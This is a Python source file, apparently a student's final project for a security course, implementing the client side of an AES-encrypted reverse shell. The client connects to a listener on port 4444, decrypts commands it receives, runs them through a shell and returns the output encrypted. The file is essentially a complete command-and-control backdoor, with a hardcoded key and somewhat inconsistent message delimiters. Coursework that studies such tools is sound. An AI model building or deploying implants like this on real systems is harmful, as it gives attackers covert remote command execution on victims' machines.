#/usr/bin/python3
#Huy Le
#OPSC-540-81A
#Week 8: Final Project Code (Client)
#March 5, 2021

#import modules
import socket
import os
import sys
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

#global variables (IP address, Port #, Max message size, SERVER object, encryption key, initialization vector)
IP = '127.0.0.1'
PORT = 4444
MAX_SIZE = 1024
SERVER = ''
AES_KEY = b'testingkey123456'
#IV = '' #for testing


##################################################################################################
#server-side functions

def startsocket():
    #creates socket object and binds to IP/port
    global SERVER
    try:
        SERVER = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        SERVER.connect((IP,PORT))
        dataS, initVec = encryptcommands('Hullo from here')
        SERVER.send(dataS+b'---'+initVec)
    except:
        print('Error binding port\n')
        sys.exit()

def communication():
    #manages communication between devices
    #encryptcommands() function will be used here as well to encrypt results
    #Receives encrypted commands from server, executes, and returns output
    #data received and sent is either encrypted or decrypted with AES utilizing encryption key and initialization vector (IV)

    global SERVER

    while True:
        try:
            #receives data of size MAX_SIZE, decrypts and displays
            data = SERVER.recv(MAX_SIZE)
            deData = decryptcommands(data)
            res = executecommand(deData)
            #CnC command input
            #if ('exit' in dataS):
            #    print('Exiting Server and Shutting Down\n')
            #    break
            #encrypts input and returns ciphertext with IV
            dataS,initVec = encryptcommands(res)
            #sends ciphertext and appends IV with byte string +++ for splitting on server side
            SERVER.send(dataS+b'---'+initVec)
        except Exception as e:
            print('Shutting down Server due to error')
            print(e)
            break
    

###############################################################################################
#joined functions

def encryptcommands(command):
    #encrypts commands that will be sent
    #returns encrypted command with IV
    #global IV #for testing
    cipher = AES.new(AES_KEY, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(bytes(command,encoding='utf-8'),AES.block_size))
    IV = cipher.iv
    return ciphertext, IV


def decryptcommands(ciphertext):
    #decrypts commands received and displays
    #utilizes byte string --- to split client string, tempData[0]=ciphertext, tempData[1]=IV
    tempData = ciphertext.split(b'+++')
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=tempData[1])
    data = unpad(cipher.decrypt(tempData[0]),AES.block_size)
    print(f'Decrypted command: {data.decode()}')
    return (data.decode())


##############################################################################################
#client-side functions

def checksandsetter():
    #when script is started, check device platform
    plat = sys.platform
    print(f'This system is running {plat}\n')

def executecommand(command):
    #proceeds by executing decrypted command
    #returns redirected standard input, output, or error
    if ('exit' in command):
        global SERVER
        print('Disconnect from server\n')
        SERVER.close()
        sys.exit()
    elif ('cd' in command):
        path = command[3:]
        try:
            os.chdir(path)
        except:
            print('DNE\n')
    cmd=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    return (cmd.stdout.read().decode() + cmd.stderr.read().decode())


#################################################################################################
#main
if __name__ == '__main__':
    startsocket()
    checksandsetter()
    communication()
    SERVER.close()
    sys.exit()
